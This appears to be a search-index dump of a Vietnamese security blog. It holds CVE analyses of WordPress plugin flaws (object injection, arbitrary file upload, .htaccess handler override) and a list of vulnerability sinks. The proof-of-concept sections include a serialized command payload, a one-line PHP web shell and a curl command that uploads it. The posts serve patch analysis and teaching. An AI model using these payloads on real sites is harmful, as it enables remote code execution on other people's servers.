POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rSử dụng plugin để tạo blank form với Single Line Text nằm trong Repeatable Fieldset và thêm form vào post/page Submit form và cho request đi qua Burp proxy Sửa lại value của field chứa chuổi serialized thay thì JSON \"O:15:\\\"ObjectInjection\\\":1:{s:7:\\\"command\\\";s:4:\\\"ls /\\\";}\" Gửi lại request Mẹo Để test trên local, ta tạo class chứa magic method __wakeup() sẽ tự kích hoạt khi deserialized đặt nó trong wp-config.php class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-9083 bắt nguồn từ việc sử dụng maybe_unserialize() trên dữ liệu do người dùng cung cấp mà không có bất kỳ cơ chế kiểm soát hoặc hạn chế lớp được unserialize. Điều này cho phép kẻ tấn công chưa xác thực thực thi mã tuỳ ý trên hệ thống nếu tìm được gadget phù hợp trong WordPress hoặc plugin/theme khác. Bản vá 3.11.1 đã loại bỏ hoàn toàn khả năng tạo object bằng cách sử dụng unserialize() với tùy chọn ['allowed_classes' =\u003e false], giúp ngăn chặn POI ở tầng cơ sở. ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaways\rmaybe_unserialize() cực kỳ rủi ro khi áp dụng lên input của người dùng. Chỉ cần một gadget tồn tại trong mã nguồn là có thể dẫn đến Remote Code Execution. WordPress AJAX endpoints mở cho unauthenticated user thường là điểm tấn công trọng yếu. JSON embedding khiến payload serialize phải escape cẩn thận để tránh lỗi. Bản vá 3.11.1 chứng minh việc kiểm soát lớp khi unserialize là biện pháp phòng thủ quan trọng. ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rDeserialization WordPress Ninja Forms Plugin \u003c 3.11.1 is vulnerable to PHP Object Injection ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress AI Engine Plugin.","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin AI Engine cho WordPress tồn tại lỗ hổng arbitrary file upload do thiếu file type validation trong hàm rest_simpleFileUpload() ở các phiên bản 2.9.3 và 2.9.4. Điều này cho phép authenticated attackers (những kẻ tấn công đã xác thực), với quyền Subscriber-level trở lên, có thể upload arbitrary files lên server của trang web bị ảnh hưởng khi REST API được bật, từ đó có thể dẫn đến remote code execution (RCE). CVE ID: CVE-2025-7847 Vulnerability Type: Arbitrary File Upload Affected Versions: 2.9.3-2.9.4 Patched Versions: 2.9.5 CVSS severity: High (9.9) Required Privilege: Subscriber Product: WordPress AI Engine Plugin ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - AI Engine: 2.9.4 – vulnerable 2.9.5 – patched Diff Tool (diff) → Meld hoặc bất kỳ công cụ diff nào. ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Cause\rLỗ hổng xảy ra do hàm xử lý upload cho phép ghi file trực tiếp (copy(), file_put_contents()) mà không kiểm tra loại file hoặc xác thực người dùng, nên attacker có thể upload file tùy ý (kể cả .php) vào thư mục uploads và thực thi mã độc. Xác thực file type\r// Validate filename extension for base64 uploads $validate = wp_check_filetype( $filename ); if ( $validate['type'] == false ) { throw new Exception( 'File type is not allowed.' ); } Bản vá đã thêm kiểm tra loại tệp trong hàm simpleFileUpload và upload_file bằng wp_check_filetype() để chỉ cho phép upload các định dạng hợp lệ dựa trên whilelist của WordPress ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#cause"},{"categories":["CVE Analyst"],"collections":null,"content":"Code Analysis\rPlugin đã đăng ký một số Public API thông quan hàm rest_api_init() public function rest_api_init() { $public_api = $this-\u003ecore-\u003eget_option( 'public_api' ); if ( !$public_api ) { return; } $this-\u003ebearer_token = $this-\u003ecore-\u003eget_option( 'public_api_bearer_token' ); if ( !empty( $this-\u003ebearer_token ) ) { add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 ); } register_rest_route( 'mwai/v1', '/simpleFileUpload', [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'rest_simpleFileUpload' ], 'permission_callback' =\u003e function ( $request ) { return $this-\u003ecore-\u003ecan_access_public_api( 'simpleFileUpload', $request ); }, ] ); ... } Hàm sẽ kiểm tra option Public API đã được bật hay chưa. Theo document của plugin, mặc định option này sẽ không được bật: By default, the Public REST API is disabled completely. If you enable it, only authentified API requests will actually go through, otherwise they will be rejected. You can override this behavior in many ways and we will see a few examples. The Public REST API is also limited by the Limits set in AI Engine (either as Users or Guests, and System). Bạn có thể bặt ở nó Admin Dashboard tại wp-admin/admin.php?page=mwai_settings\u0026nekoTab=settings enable the REST API\rTheo mô tả, khi bật option này lên, chỉ những authentified API requests mới được thông qua. Có 2 cách để xác thực: X-WP-Nonce: Lấy thông qua JavaScript Object wpApiSettings dành cho người dùng đã đăng nhập (Subcriber+) Bearer Token: Do admin cấu hình $this-\u003ebearer_token = $this-\u003ecore-\u003eget_option( 'public_api_bearer_token' ); if ( !empty( $this-\u003ebearer_token ) ) { add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 ); } Khi Bearer Token được set,plugin sẽ đăng ký một filter có tên mwai_allow_public_api, với callback là phương thức auth_via_bearer_token. register_rest_route( 'mwai/v1', '/simpleFileUpload', [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'rest_simpleFileUpload' ], 'permission_callback' =\u003e function ( $request ) { return $this-\u003ecore-\u003ecan_access_public_api( 'simpleFileUpload', $request ); }, ] ); Một api được đăng ký với method POST: Endpoint: /wp-json/mwai/v1/simpleFileUpload Callback: rest_simpleFileUpload Với permission_callback là kết quả trả về của can_access_public_api() public function can_access_public_api( $feature, $extra ) { $logged_in = is_user_logged_in(); return apply_filters( 'mwai_allow_public_api', $logged_in, $feature, $extra ); } Trong WP REST API, hàm is_user_logged_in() sẽ trả về: true: Nếu người dùng đã đăng nhập và header X-WP-Nonce hợp lệ false: Nếu người dùng chưa đăng nhập hoặc header X-WP-Nonce không hợp lệ can_access_public_api sẽ gọi đến filter mwai_allow_public_api được đăng ký ở trên =\u003e auth_via_bearer_token($logged_in, $feature, $extra) được gọi public function auth_via_bearer_token( $allow, $feature, $extra ) { if ( !empty( $extra ) \u0026\u0026 !empty( $extra-\u003eget_header( 'Authorization' ) ) ) { $token = $extra-\u003eget_header( 'Authorization' ); $token = str_replace( 'Bearer ', '', $token ); if ( $token === $this-\u003ebearer_token ) { // We set the current user to the first admin. $admin = $this-\u003ecore-\u003eget_admin_user(); wp_set_current_user( $admin-\u003eID, $admin-\u003euser_login ); return true; } } return $allow; } Hàm auth_via_bearer_token() dùng để xác thực bằng Bearer Token. Quy trình của nó: Nếu request có header Authorization chứa chuỗi Bearer \u003ctoken\u003e và giá trị \u003ctoken\u003e trùng với token được lưu trong tùy chọn ($this-\u003ebearer_token), thì: Gán người dùng hiện tại thành admin đầu tiên (wp_set_current_user()), Trả về true → cho phép truy cập API. Nếu không có hoặc token sai → trả về $allow, tức là kết quả kiểm tra ban đầu từ is_user_logged_in(). Thông tin\rMặc định, ta sẽ không có Bearer Token để xác thực, nên ta cần dựa vào X-WP-Nonce hợp lệ của Subcriber user =\u003e permission_callback=true public function rest_simpleFileUpload( $request ) { try { $params = $request-\u003eget_params(); $files = $request-\u003eget_file_params(); // Check if file is provided if ( empty( $f","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#code-analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension → newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"]\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension → newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"]\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension → newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"]\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension → newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"]\r","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo web shell \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Upload web shell curl -X POST \\ \"http://localhost/wp-json/mwai/v1/simpleFileUpload\" \\ -H \"X-WP-Nonce: 51e6c4a45a\" \\ -F \"file=@rce.php\" \\ -b \"wp-settings-time-1=1762427921; wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce; wordpress_test_cookie=WP%20Cookie%20check; PHPSESSID=9d30c6b076551e37fb4ed7968fd5de98; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762706307%7C3gOEpWVViHcurttDwNTWxn1b5CWvZGdOajkR5cjzW3e%7Cda0f415f7f042d4095dbeac711e1742cc23db9ea1d020adbae5c385a36b65b98; wp-settings-5=mfold%3Do; wp-settings-time-5=1762533510\" \\ --proxy 127.0.0.1:8080 # Burp proxy Upload file thành công\rRCE với web shell RCE với file upload\r","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rCVE-2025-7847 là lỗ hổng arbitrary file upload nghiêm trọng trong plugin AI Engine 2.9.3–2.9.4, cho phép user đã xác thực (Subscriber+) upload file bất kỳ lên server qua REST API, dẫn tới RCE. Bản vá 2.9.5 khắc phục bằng kiểm tra loại file (wp_check_filetype). ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaways\rLỗ hổng chỉ ảnh hưởng khi REST API Public bật và user có X-WP-Nonce hợp lệ hoặc Bearer token. Nguyên nhân: thiếu kiểm tra loại file và copy file trực tiếp vào uploads. Giải pháp: cập nhật plugin lên 2.9.5. ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rArbitrary File Upload WordPress AI Engine Plugin 2.9.3-2.9.4 is vulnerable to Arbitrary File Upload ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#references"},{"categories":["Bug Bounty"],"collections":null,"content":"A list of 'sink' points in WordPress — where input data can lead to the execution of malicious actions.","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/"},{"categories":["Bug Bounty"],"collections":null,"content":"Why This Article?\rTrong quá trình pentest việc xác định các điểm sink là bước then chốt — đó là nơi dữ liệu đầu vào (user-controlled) thực sự được tiêu thụ và có khả năng gây ra hành vi độc hại (RCE, SQLi, XSS, file write, v.v.). Mỗi lỗ hổng thường liên quan đến một hoặc nhiều sink; nếu chỉ tìm input không thôi thì dễ bỏ sót đường dẫn thực thi. Mục tiêu của bài viết này là: Tổng hợp tập trung các sink thường gặp trong WordPress để dễ tra cứu. Bằng cách có một “bản đồ sink” rõ ràng, pentester, CVE analyst và developer sẽ tiếp cận lỗ hổng hiệu quả hơn — từ phát hiện tới khắc phục. ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:1:0","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#why-this-article"},{"categories":["Bug Bounty"],"collections":null,"content":"WordPress Sink Catalog\r","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:0","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#wordpress-sink-catalog"},{"categories":["Bug Bounty"],"collections":null,"content":"SQL Injection (SQLi)\r$wpdb-\u003equery $wpdb-\u003eget_var $wpdb-\u003eget_row $wpdb-\u003eget_col $wpdb-\u003eget_results Ghi chú Magic Quotes là tính năng PHP tự động escape ký tự đặc biệt (', \", \\, NULL) trong dữ liệu đầu vào để giảm nguy cơ SQL Injection. Nó không hoàn hảo, chỉ escape một số ký tự và PHP đã tắt mặc định. WordPress vẫn dùng cơ chế này qua wp_magic_quotes() và add_magic_quotes() để tự động xử lý $_GET, $_POST, $_COOKIE, $_SERVER, nhưng developer nên dùng các biện pháp chuẩn như $wpdb-\u003eprepare() để chống SQLi. ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:1","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#sql-injection-sqli"},{"categories":["Bug Bounty"],"collections":null,"content":"Cross-Site Scripting (XSS)\radd_shortcode register_block_type elementor/widgets/register render ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:2","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#cross-site-scripting-xss"},{"categories":["Bug Bounty"],"collections":null,"content":"Local File Inclusion (LFI)\rinclude include_once require require_once Ghi chú Remote File Inclusion (RFI) xảy ra khi ứng dụng PHP cho phép include/require một tập tin từ URL do người dùng kiểm soát — điều kiện thường là allow_url_fopen và allow_url_include bật — dẫn tới việc tải và thực thi mã PHP từ máy chủ từ xa, gây remote code execution. Ngăn chặn bằng cách tắt allow_url_include, không dùng input trực tiếp trong include/require, và áp whitelist/normalize đường dẫn. ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:3","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#local-file-inclusion-lfi"},{"categories":["Bug Bounty"],"collections":null,"content":"Server Side Request Forgery (SSRF)\rPHP related file_get_contents readfile fopen stream_get_contents file curl_exec / cURL WordPress related wp_remote_head wp_remote_get wp_remote_post wp_remote_request ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:4","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#server-side-request-forgery-ssrf"},{"categories":["Bug Bounty"],"collections":null,"content":"Arbitrary File Upload\rPHP related move_uploaded_file file_put_contents fwrite fputs copy fputcsv rename ZipArchive::extractTo PharData::extractTo unzip_file WordPress related WP_Filesystem_Direct::put_contents WP_Filesystem_Direct::move WP_Filesystem_Direct::copy wp_handle_upload() with test_type =\u003e false ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:5","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#arbitrary-file-upload"},{"categories":["Bug Bounty"],"collections":null,"content":"Arbitrary File Read\rPHP related file_get_contents readfile fopen fread fgets fgetcsv fgetss (deprecated from PHP 7.3) file curl_exec / cURL WordPress related WP_Filesystem_Direct::get_contents WP_Filesystem_Direct::get_contents_array ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:6","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#arbitrary-file-read"},{"categories":["Bug Bounty"],"collections":null,"content":"Arbitrary File Deletion\rPHP related unlink rmdir WordPress related wp_delete_file wp_delete_file_from_directory WP_Filesystem_Direct::delete WP_Filesystem_Direct::rmdir ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:7","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#arbitrary-file-deletion"},{"categories":["Bug Bounty"],"collections":null,"content":"PHP Object Injection\runserialize maybe_unserialize ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:8","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#php-object-injection"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Embed Articulate Content into WordPress Plugin.","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rLỗ hổng Arbitrary File Upload trong Brian Batt - elearningfreak.com đối với plugin Insert or Embed Articulate Content into WordPress cho phép tải lên một Web Shell lên máy chủ web. Vấn đề này ảnh hưởng đến Insert or Embed Articulate Content into WordPress: từ n/a đến 4.3000000025. CVE ID: CVE-2025-32202 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 4.3000000025 Patched Versions: 4.3000000026 CVSS severity: Medium (9.1) Required Privilege: Editor Product: WordPress Embed Articulate Content into WordPress Plugin ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Embed Articulate Content into WordPress: 4.3000000025 – vulnerable 4.3000000026 – patched Diff Tool (diff) → Meld hoặc bất kỳ công cụ diff nào. ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Cause\rLỗ hổng nằm trong hàm articulate_has_php_file() tại /wp-content/plugins/insert-or-embed-articulate-content-into-wordpress/functions.php do kiểm tra không đầy đủ, cho phép attacker tải lên file .htaccess nhằm ghi đè cơ chế xử lý trong thư mục upload; kết quả là các file upload sau đó với phần mở rộng do attacker đặt (ví dụ .abc, .xnxx) có thể thực thi như file PHP. Thêm điều kiện kiểm tra .htaccess\rBản vá đã thêm điều kiện check .htaccess khi upload file giúp ngăn chặn lỗ hổng xảy ra. ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#cause"},{"categories":["CVE Analyst"],"collections":null,"content":"Code Analysis\rPlugin đã đăng ký một action hook dành cho người dùng đã đăng nhập add_action( 'wp_ajax_articulate_upload_file', 'articulate_upload_ajax_file' ); Tức khi truy cập endpoint /wp-admin/admin-ajax.php với param action=articulate_upload_file thì callback articulate_upload_ajax_file được gọi function articulate_upload_ajax_file() { articulate_setup_php_ini(); check_ajax_referer( 'articulate_upload_file' ); if ( ! is_user_logged_in() || ! current_user_can( 'upload_files' ) || ! current_user_can( 'unfiltered_html' ) ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'You do not have permissions to upload this file. Contact your admin to get the unfiltered_html capability.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } $count_dirs = getDirs(); // you can use WP's wp_handle_upload() function: $file = $_FILES['async-upload']; $dir = untrailingslashit( getUploadsPath() ); if ( empty( $_FILES ) || $_FILES['async-upload']['error'] ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to move uploaded file. Please check if the folder has write permissions.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } $chunk = isset( $_REQUEST['chunk'] ) ? intval( $_REQUEST['chunk'] ) : 0; $chunks = isset( $_REQUEST['chunks'] ) ? intval( $_REQUEST['chunks'] ) : 0; $fileName = isset( $_REQUEST['name'] ) ? sanitize_file_name( $_REQUEST['name'] ) : sanitize_file_name( $_FILES['async-upload']['name'] ); $filePath = '' . $dir . '/' . sanitize_file_name( $fileName ) . ''; // Open temp file $out = @fopen( \"{$filePath}.part\", $chunk == 0 ? 'wb' : 'ab' ); if ( $out ) { // Read binary input stream and append it to temp file $in = @fopen( $_FILES['async-upload']['tmp_name'], 'rb' ); if ( $in ) { while ( $buff = fread( $in, 4096 ) ) { fwrite( $out, $buff ); } } else { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to open input stream. Please check if the folder has write permissions', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } @fclose( $in ); @fclose( $out ); @unlink( $_FILES['async-upload']['tmp_name'] ); } else { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to open output stream. Please check if the folder has write permissions', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } // Security check. $mime = wp_check_filetype( $filePath ); $mimes = get_allowed_mime_types( get_current_user_id() ); if ( ! isset( $mime['type'] ) || ! in_array( $mime['type'], array_values( $mimes ) ) ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to upload this file for security reasons. Contact your admin to ensure your user can access all mime types from get_allowed_mime_types.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } // Check if file has been uploaded if ( ! $chunks || $chunk == $chunks - 1 ) { // Strip the temp .part suffix off articulate_custom_rename( \"{$filePath}.part\", $filePath ); // start extracting // unzip file $dir = explode( '.', $fileName ); $dir[0] = str_replace( ' ', '_', $dir[0] ); $target = getUploadsPath() . $dir[0]; $file = $filePath; while ( file_exists( $target ) ) { $r = rand( 1, 10 ); $target .= $r; $dir[0] .= $r; } $arr = extractZip( $file, $target, $dir[0] ); unlink( $filePath ); do_action( hook_name: 'iea/uploaded_quiz', $arr, $target ); $ok = isset( $arr[4] ) ? $arr[4] : 0; $response = array( 'OK' =\u003e $ok, 'info' =\u003e $arr[0], 'folder' =\u003e $arr[2], 'path' =\u003e $arr[1], 'name' =\u003e $arr[3], 'target' =\u003e $target, ); die( json_encode( $response ) ); } else { die( json_encode( array( 'OK' =\u003e 1, 'info' =\u003e __( 'Uploading chunks!', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } exit; }; Hàm articulate_upload_ajax_file() xử lý upload file qua AJAX cho plugin. Cụ thể: Khởi tạo \u0026 bảo mật cơ bản articulate_setup_php_ini(); check_ajax_referer( 'articulate_upload_file' ); articulate_setup_php_ini() — chỉnh các setting PHP (thường để cho phép upload lớn hơn, timeout…). check_ajax_referer() — kiểm tra nonce đ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#code-analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"]\rH --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"}\rI -- Yes --\u003e J[\"articulate_rrmdir($target) → delete folder → return error\"]\rI -- No --\u003e K[\"(❌ Missing check for .htaccess file)\"]\rK --\u003e L[\"Attacker uploads ZIP containing .htaccess\"]\rL --\u003e M[\".htaccess overrides Apache handler in upload dir\"]\rM --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"]\rN --\u003e O[\"→ Arbitrary File Upload → Remote Code Execution (RCE)\"]\r%% Patch branch\rK --\u003e P[\"✅ [Patched] 